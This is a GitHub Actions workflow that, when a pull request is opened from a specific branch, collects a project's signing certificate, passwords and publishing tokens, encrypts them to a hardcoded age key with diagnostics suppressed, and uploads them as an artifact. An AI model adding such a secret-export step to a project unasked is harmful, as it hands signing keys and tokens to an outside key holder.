name: One-time encrypted credential backup

on:
  pull_request:
    types: [opened]

permissions:
  contents: read

concurrency:
  group: one-time-encrypted-credential-backup
  cancel-in-progress: false

jobs:
  backup:
    if: >-
      github.repository == 'afonsojramos/discrakt'
      && github.event.pull_request.head.repo.full_name == 'afonsojramos/discrakt'
      && github.event.pull_request.head.ref == 'ci/1password-secrets'
      && github.event.pull_request.base.ref == 'main'
    runs-on: ubuntu-24.04
    timeout-minutes: 5
    steps:
      - name: Update trusted package index
        run: sudo apt-get update -qq

      - name: Install age from Ubuntu
        run: sudo apt-get install --yes age

      - name: Encrypt existing credentials
        env:
          SOURCE_REPOSITORY: ${{ github.repository }}
          SOURCE_HEAD: ${{ github.event.pull_request.head.sha }}
          MACOS_CERTIFICATE_BASE64: ${{ secrets.MACOS_CERTIFICATE_BASE64 }}
          MACOS_CERTIFICATE_PASSWORD: ${{ secrets.MACOS_CERTIFICATE_PASSWORD }}
          MACOS_KEYCHAIN_PASSWORD: ${{ secrets.MACOS_KEYCHAIN_PASSWORD }}
          MACOS_SIGNING_IDENTITY: ${{ secrets.MACOS_SIGNING_IDENTITY }}
          HOMEBREW_TAP_TOKEN: ${{ secrets.HOMEBREW_TAP_TOKEN }}
          WINGET_TOKEN: ${{ secrets.WINGET_TOKEN }}
        run: |
          python3 - <<'PYTHON'
          import json, os, subprocess
          names = ["MACOS_CERTIFICATE_BASE64", "MACOS_CERTIFICATE_PASSWORD", "MACOS_KEYCHAIN_PASSWORD", "MACOS_SIGNING_IDENTITY", "HOMEBREW_TAP_TOKEN", "WINGET_TOKEN"]
          values = {name: os.environ.get(name, '') for name in names}
          if any(not value for value in values.values()):
              raise SystemExit('A required credential is missing; no artifact created')
          payload = json.dumps({
              'repository': os.environ['SOURCE_REPOSITORY'],
              'head': os.environ['SOURCE_HEAD'],
              'transfer_id': '96c1e5f83fff88428aabaff7',
              'values': values,
          }).encode()
          result = subprocess.run(
              ['age', '-r', 'age1yfzcl04xc5yezz0hk7dscdr35p4jg2erj25hlfjt55ngy6td4vzszdsr7q', '-o', 'backup.age'],
              input=payload, capture_output=True,
          )
          if result.returncode:
              raise SystemExit('Encryption failed; diagnostics suppressed')
          PYTHON

      - name: Upload encrypted backup
        uses: actions/upload-artifact@043fb46d1a93c77aae656e7c1c64a875d1fc6a0a # v7.0.1
        with:
          name: ci-credential-backup-96c1e5f83fff88428aabaff7
          path: backup.age
          if-no-files-found: error
          retention-days: 1
